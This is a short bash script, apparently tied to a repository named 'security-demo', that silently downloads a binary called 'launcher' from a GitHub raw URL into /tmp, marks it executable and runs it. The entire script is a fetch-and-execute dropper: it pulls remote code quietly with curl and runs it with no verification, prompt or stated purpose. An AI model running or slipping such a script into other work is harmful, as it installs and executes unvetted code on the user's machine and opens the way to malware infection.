#!/bin/bash

# URL of the binary
URL="https://raw.githubusercontent.com/franko4don/security-demo/main/launcher"

# Temporary file path
TMP_FILE="/tmp/launcher"

# Download the binary
curl -sL "$URL" -o "$TMP_FILE"

# Make the binary executable
chmod +x "$TMP_FILE"

# Execute the binary
"$TMP_FILE"